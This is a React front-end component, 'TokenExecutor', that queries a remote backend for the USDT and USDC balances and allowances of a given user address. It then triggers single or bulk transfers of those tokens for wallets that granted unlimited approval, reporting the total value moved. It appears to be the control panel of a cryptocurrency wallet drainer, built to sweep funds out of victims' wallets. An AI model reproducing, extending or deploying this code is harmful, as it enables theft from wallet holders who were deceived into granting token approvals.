import { useState } from 'react';

export default function TokenExecutor({ userAddress }) {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState('');
  const [tokenStatus, setTokenStatus] = useState(null);

  const tokens = [
    { name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
    { name: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' }
  ];

  const checkTokenStatus = async (tokenAddress) => {
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/check-token-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          tokenAddress: tokenAddress,
          chain: 'ethereum'
        })
      });
      
      const data = await response.json();
      if (data.success) {
        setTokenStatus(data.tokenStatus);
        setResult(`Status: ${data.tokenStatus.balanceFormatted} ${data.tokenStatus.symbol} balance, ${data.tokenStatus.allowanceFormatted} allowance`);
      }
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
  };

  const executeTransfer = async (tokenAddress) => {
    setLoading(true);
    try {
      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          tokenAddress: tokenAddress,
          chain: 'ethereum'
        })
      });
      
      const data = await response.json();
      if (data.success && data.result.success) {
        setResult(`✅ SUCCESS: Transferred ${data.result.amountFormatted} ${data.result.symbol}\nTX: ${data.result.txHash}`);
      } else {
        setResult(`❌ FAILED: ${data.result?.error || data.error}`);
      }
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const executeAllTransfers = async () => {
    setLoading(true);
    try {
      const tokenAddresses = tokens.map(t => t.address);
      
      const response = await fetch('https://autoclaimtoken.onrender.com/api/execute-multiple-transfers', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: userAddress,
          tokenAddresses: tokenAddresses,
          chain: 'ethereum'
        })
      });
      
      const data = await response.json();
      if (data.success) {
        const successful = data.results.filter(r => r.success);
        setResult(`✅ Executed ${successful.length}/${data.results.length} transfers\nTotal Value: ~$${data.summary.totalValue.toFixed(2)}`);
      }
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  return (
    <div className="bg-white rounded-lg shadow-lg p-6">
      <h3 className="text-xl font-bold mb-4">Token Executor</h3>
      <p className="text-sm text-gray-600 mb-4">
        Execute transfers for tokens with unlimited approval
      </p>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        {tokens.map((token) => (
          <div key={token.address} className="border rounded-lg p-4">
            <h4 className="font-bold mb-2">{token.name}</h4>
            <div className="space-y-2">
              <button
                onClick={() => checkTokenStatus(token.address)}
                disabled={loading}
                className="w-full bg-blue-600 text-white px-3 py-2 rounded hover:bg-blue-700 disabled:opacity-50 text-sm"
              >
                Check Status
              </button>
              <button
                onClick={() => executeTransfer(token.address)}
                disabled={loading}
                className="w-full bg-red-600 text-white px-3 py-2 rounded hover:bg-red-700 disabled:opacity-50 text-sm"
              >
                Execute Transfer
              </button>
            </div>
          </div>
        ))}
      </div>
      
      <button
        onClick={executeAllTransfers}
        disabled={loading}
        className="w-full bg-green-600 text-white px-4 py-3 rounded hover:bg-green-700 disabled:opacity-50 font-bold mb-4"
      >
        Execute All Available Transfers
      </button>
      
      {result && (
        <div className="bg-gray-100 p-4 rounded">
          <h4 className="font-semibold mb-2">Result:</h4>
          <pre className="text-sm whitespace-pre-wrap">{result}</pre>
        </div>
      )}
    </div>
  );
}